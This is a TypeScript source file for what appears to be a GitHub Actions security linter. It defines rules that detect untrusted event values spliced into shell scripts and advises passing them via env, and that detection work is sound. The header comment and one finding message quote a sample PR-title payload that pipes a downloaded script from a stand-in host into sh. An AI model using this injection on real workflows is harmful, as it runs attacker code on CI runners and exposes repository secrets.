/**
 * Rules: expression injection.
 *
 * GitHub substitutes `${{ }}` into the YAML text *before* the shell sees it, so
 * `run: echo "${{ github.event.pull_request.title }}"` is string concatenation
 * in a bash script. A title of `"; curl evil.sh | sh; #` runs commands.
 *
 * The fix is not "escape harder" — it is to route the value through `env:`,
 * which GitHub passes as a real environment variable the shell quotes.
 */

import type { Rule } from './context.ts';
import { anchorOf, expressionsInStep, locateExpression, stepPath } from './context.ts';
import type { StepModel } from '../model.ts';
import type { TriggerKey } from '../model.ts';
import { findExpressions, findUntrustedUse } from '../expressions.ts';
import { isPrivilegedEvent, triggersFor } from '../analysis.ts';
import type { UntrustedExecution } from '../analysis.ts';
import { findUntrustedExecution } from '../analysis.ts';

/** Fields where substitution happens in a shell / script context. */
type InjectField = 'run' | 'script' | 'with' | 'env' | 'if';

function fieldLabel(field: InjectField, key?: string): string {
  switch (field) {
    case 'run':
      return '`run:` 脚本';
    case 'script':
      return '`script:`';
    case 'with':
      return `\`with.${key}\` 参数`;
    case 'env':
      return `\`env.${key}\` 值`;
    case 'if':
      return '`if:` 条件';
  }
}

/**
 * Is substitution into this field a shell-injection sink?
 *  - `run:` yes.
 *  - `script:` of actions/github-script yes (it is JS evaluated in node).
 *  - `with:` only for actions that treat the input as code/config
 *    (`script`, `command`, `args`, `token`, `url`, `branch`, `tag`…). We
 *    restrict to the well-known ones to avoid noise.
 *  - `env:` no — that is the fix.
 *  - `if:` no — GitHub evaluates it as an expression, not a shell.
 */
function isSink(field: InjectField, key: string | undefined, step: StepModel): boolean {
  if (field === 'run' || field === 'script') return true;
  if (field === 'env' || field === 'if') return false;
  if (field === 'with') {
    if (!key) return false;
    const uses = (step.uses ?? '').toLowerCase();
    const shellLikeInput = /^(?:script|command|cmd|args|entrypoint|options|flags|code)$/.test(key);
    if (shellLikeInput) return true;
    // github-script / actions that eval inline code
    if (/github-script/.test(uses) && /^script$/.test(key)) return true;
    // values that end up in a command line for well-known tools
    if (/setup-|cache|artifact|docker|gcloud|aws-|kubectl|helm|ssh|scp|rsync/.test(uses) && /^(?:args|options|flags|extra-args|build-args)$/.test(key)) return true;
    return false;
  }
  return false;
}

function shellEscapeHint(value: string): string {
  return value.trim();
}

export const expressionInjectionRule: Rule = {
  meta: {
    id: 'WF010',
    title: '外部可控内容被直接拼进脚本',
    category: 'script-injection',
    severity: 'high',
    summary: '`${{ github.event.*.title }}` 这类值在 shell 看到之前就展开了，可以注入命令。',
    references: [
      'https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections',
      'https://securitylab.github.com/research/github-actions-untrusted-input/',
    ],
  },
  run(ctx) {
    const triggers = triggersFor(ctx.model);
    const privileged = isPrivilegedEvent(triggers);

    for (const job of ctx.model.jobs) {
      const exec: UntrustedExecution | null = findUntrustedExecution(ctx.model, job);
      const secrets = job.secretRefs;

      for (const step of job.steps) {
        for (const hit of expressionsInStep(step)) {
          if (!isSink(hit.field, hit.key, step)) continue;
          // `inputs.*` is WF012's job; reporting here too would double-count.
          if (/^(?:inputs|github\.event\.inputs)\./.test(hit.expr.trim())) continue;
          const use =
            findUntrustedUse(hit.expr, triggers as TriggerKey[]) ??
            matrixDerivedUse(hit.expr, job.matrix, triggers as TriggerKey[]);
          if (!use) continue;

          const pos = locateExpression(ctx.source, hit.node, hit.raw, hit.occurrence);
          const severity = chooseSeverity({
            confidence: use.source.confidence,
            privileged,
            hasSecrets: secrets.length > 0 || job.permissions.writeScopes.length > 0,
            directShell: hit.field === 'run' || hit.field === 'script',
          });

          ctx.sink.add({
            rule: this.meta,
            severity,
            anchor: { line: pos.line, column: pos.column, endLine: anchorOf(ctx.source, hit.node).endLine },
            path: `${stepPath(job, step)}.${hit.field}${hit.key ? `.${hit.key}` : ''}`,
            evidence: hit.raw,
            message: `${fieldLabel(hit.field, hit.key)} 里直接插入了${use.source.label}（\`${use.path}\`）。GitHub 在 YAML 展开阶段就把它替换进脚本文本，shell 无法区分「数据」和「命令」；贡献者只要把标题写成 \`"; curl https://…/x.sh | sh; #\` 就能执行任意命令。${privileged ? '该工作流使用特权事件，注入成功即可接触仓库密钥与写权限。' : ''}${exec ? '该任务还会执行 fork 代码。' : ''}`,
            advice: `改为经 \`env:\` 传递，让 shell 用引号处理数据：
\`\`\`yaml
env:
  TITLE: \${{ github.event.pull_request.title }}
run: echo "$TITLE"     # 双引号内是变量，不是重新求值
\`\`\`
若必须和脚本拼接，用 \`jq -r\` / \`printf '%q'\` 转义，或干脆只做 \`case\`/\`grep -F\` 匹配，不把它当代码。`,
            patch: `env:
  PR_TITLE: \${{ ${shellEscapeHint(use.path)} }}
run: |
  # 引号内引用变量，shell 不会二次解释
  echo "PR title: $PR_TITLE"`,
            references: this.meta.references,
          });
        }
      }
    }
  },
};

/**
 * `matrix.*` values come from `strategy.matrix`, which can itself be filled from
 * the event payload (`fromJSON(github.event.pull_request.labels.*.name)`). In
 * that case every use of the matrix variable is attacker-controlled.
 */
function matrixDerivedUse(
  expr: string,
  matrix: Map<string, import('../model.ts').ScalarModel>,
  triggers: TriggerKey[],
): { source: import('../expressions.ts').UntrustedSource; path: string } | null {
  const m = /^matrix\.([A-Za-z_][A-Za-z0-9_-]*)\b/.exec(expr.trim());
  if (!m) return null;
  const def = matrix.get(m[1]) ?? matrix.get(m[1].replace(/-/g, '_'));
  if (!def) return null;
  for (const inner of findExpressions(def.value)) {
    const hit = findUntrustedUse(inner.expr, triggers);
    if (hit) return { source: hit.source, path: `matrix.${m[1]} ← ${hit.path}` };
  }
  return null;
}

function chooseSeverity(input: {
  confidence: 'confirmed' | 'possible';
  privileged: boolean;
  hasSecrets: boolean;
  directShell: boolean;
}): 'critical' | 'high' | 'medium' | 'low' {
  if (input.confidence === 'possible' && !input.privileged) return 'medium';
  if (input.privileged && input.hasSecrets) return 'critical';
  if (input.privileged) return input.directShell ? 'critical' : 'high';
  if (input.hasSecrets) return input.directShell ? 'high' : 'medium';
  return input.directShell ? 'medium' : 'low';
}

/**
 * WF011: `${{ github.event.*.title }}` used in a bash `if` guard for a command
 * is a subtler variant of WF010; separate because the fix differs (`if:`
 * condition or env var in a gate script).
 */
export const commandGuardInjectionRule: Rule = {
  meta: {
    id: 'WF011',
    title: '依据外部文本决定是否执行命令',
    category: 'script-injection',
    severity: 'high',
    summary: '把外部文本当作 `if`/`case` 条件来授权命令，等价于把命令执行交给贡献者。',
  },
  run(ctx) {
    const triggers = triggersFor(ctx.model);
    for (const job of ctx.model.jobs) {
      for (const step of job.steps) {
        if (!step.run) continue;
        // e.g. `if [ "${{ github.event.comment.body }}" = "/deploy" ]; then ...`
        for (const m of step.run.text.matchAll(/["']?\$\{\{\s*(github\.event\.[^}]+?)\s*\}\}["']?/g)) {
          const expr = m[1];
          const use = findUntrustedUse(expr, triggers as TriggerKey[]);
          if (!use) continue;
          if (!/if\s|case\s|\[\[?/.test(step.run.text)) continue;
          const stepPrefix = stepPath(job, step);
          // WF010 already flags the same substitution with the env-passing fix;
          // here we only add the "don't gate commands on this value" point.
          const duplicated = ctx.sink.findings.some(
            (f) => f.ruleId === 'WF010' && f.path.startsWith(`${stepPrefix}.run`),
          );
          if (duplicated) continue;
          const pos = locateExpression(ctx.source, step.run.node, m[0], 0);
          ctx.sink.add({
            rule: this.meta,
            severity: 'high',
            anchor: { line: pos.line, column: pos.column, endLine: pos.line },
            path: `${stepPath(job, step)}.run`,
            evidence: m[0],
            message: `脚本用${use.source.label}（\`${use.path}\`）作为命令的准入条件。即使把它放进引号，贡献者也能构造 \`$(…)\` 或 \`\`\`…\`\`\`\` 之类的内容（在 \`[[ ]]\` 与 \`test\` 中行为不同），更常见的是直接匹配到错误分支。`,
            advice: `准入判断放到 \`if:\` 表达式（GitHub 表达式引擎不经过 shell），或经 \`env:\` 传入后在脚本里用 \`[ "$BODY" = "/deploy" ]\` 严格比较。`,
          });
        }
      }
    }
  },
};

/** WF012: workflow_dispatch / workflow_call inputs are lower-trust than they look. */
export const dispatchInputInjectionRule: Rule = {
  meta: {
    id: 'WF012',
    title: '手工触发/可复用工作流的输入被拼进脚本',
    category: 'script-injection',
    severity: 'medium',
    summary: '`inputs.*` 由触发者填写；写权限用户即可注入命令。',
  },
  run(ctx) {
    const triggers = triggersFor(ctx.model);
    const dispatch = triggers.includes('workflow_dispatch');
    if (!dispatch && !triggers.includes('workflow_call')) return;
    // With only `workflow_call`, the values come from caller workflows that live
    // in code-reviewed files; that is a hardening note, not an outsider path.
    const severity: 'medium' | 'low' = dispatch ? 'medium' : 'low';
    // The same input usually appears in several steps; report it once.
    const reported = new Set<string>();
    for (const job of ctx.model.jobs) {
      for (const step of job.steps) {
        for (const hit of expressionsInStep(step)) {
          if (!isSink(hit.field, hit.key, step)) continue;
          if (!/^(?:inputs|github\.event\.inputs)\./.test(hit.expr)) continue;
          const inputName = hit.expr.trim();
          if (reported.has(inputName)) continue;
          reported.add(inputName);
          const pos = locateExpression(ctx.source, hit.node, hit.raw, hit.occurrence);
          ctx.sink.add({
            rule: this.meta,
            severity,
            anchor: { line: pos.line, column: pos.column, endLine: pos.line },
            path: `${stepPath(job, step)}.${hit.field}`,
            evidence: hit.raw,
            message: `\`${hit.expr}\` 是触发者填写的输入，直接拼进${fieldLabel(hit.field, hit.key)}。${dispatch ? '能手工触发该工作流的人（写权限用户、或被授权的机器人）就能注入命令；如果触发者权限高于工作流所需，这就是一次提权。' : '该工作流只能被可复用调用，输入来自调用方工作流；调用方一旦把它和外部数据接通，这里就成了注入点。'}`,
            advice: `经 \`env:\` 传递并在脚本内当数据处理；必要时用 \`type: choice\` 把输入限定为枚举值。`,
          });
        }
      }
    }
  },
};

export const scriptInjectionRules: Rule[] = [
  expressionInjectionRule,
  commandGuardInjectionRule,
  dispatchInputInjectionRule,
];
